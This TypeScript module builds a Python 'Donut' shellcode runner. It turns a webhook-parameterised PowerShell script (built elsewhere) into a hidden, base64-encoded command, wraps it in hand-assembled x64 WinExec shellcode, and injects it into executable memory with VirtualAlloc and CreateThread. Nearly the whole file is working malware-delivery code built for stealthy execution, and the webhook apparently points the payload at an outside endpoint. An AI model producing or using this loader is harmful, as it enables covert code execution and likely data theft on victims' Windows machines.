import { buildPs1 } from "./ps1.js";

export function buildDonut(webhook: string): string {
  const ps1 = buildPs1(webhook);
  // PowerShell -EncodedCommand takes UTF-16LE base64
  const b64 = Buffer.from(ps1, "utf16le").toString("base64");
  const cmd = `powershell -WindowStyle Hidden -NonInteractive -EncodedCommand ${b64}`;

  // x64 WinExec shellcode stub (34 bytes):
  //   48 83 EC 28        sub  rsp, 0x28
  //   48 83 E4 F0        and  rsp, -16
  //   48 8D 0D 13 00 00 00  lea rcx, [rip+0x13]   <- points at cmd string below
  //   31 D2              xor  edx, edx
  //   48 B8 ?? x8        mov  rax, <WinExec addr>  <- patched at runtime
  //   FF D0              call rax
  //   48 83 C4 28        add  rsp, 0x28
  //   C3                 ret
  // Command string appended immediately after (null-terminated).
  // WinExec address resolved via ctypes at runtime (no PEB walk needed).

  const scHex = [
    "0x48","0x83","0xEC","0x28",
    "0x48","0x83","0xE4","0xF0",
    "0x48","0x8D","0x0D","0x13","0x00","0x00","0x00",
    "0x31","0xD2",
    "0x48","0xB8",
  ].join(",");

  return `#!/usr/bin/env python3
"""
Donut SC — x64 WinExec shellcode runner
Resolves WinExec via ctypes (no PEB walk), builds shellcode at runtime,
injects into self via VirtualAlloc + CreateThread.
Run on Windows: python donut.py
"""
import ctypes, struct, sys

def run():
    k32  = ctypes.WinDLL("kernel32", use_last_error=True)
    k32.WinExec.restype  = ctypes.c_uint
    k32.WinExec.argtypes = [ctypes.c_char_p, ctypes.c_uint]
    we   = ctypes.cast(k32.WinExec, ctypes.c_size_t).value

    stub = bytearray([${scHex}])
    stub += struct.pack("<Q", we)
    stub += bytes([0xFF,0xD0, 0x48,0x83,0xC4,0x28, 0xC3])

    cmd  = ${JSON.stringify(cmd)}.encode("ascii") + b"\\x00"
    sc   = bytes(stub) + cmd

    k32.VirtualAlloc.restype  = ctypes.c_size_t
    mem  = k32.VirtualAlloc(None, len(sc), 0x3000, 0x40)  # MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE
    ctypes.memmove(mem, sc, len(sc))

    k32.CreateThread.restype  = ctypes.c_size_t
    th   = k32.CreateThread(None, 0, ctypes.c_size_t(mem), None, 0, None)
    k32.WaitForSingleObject(ctypes.c_size_t(th), 0xFFFFFFFF)

if sys.platform == "win32":
    run()
`;
}
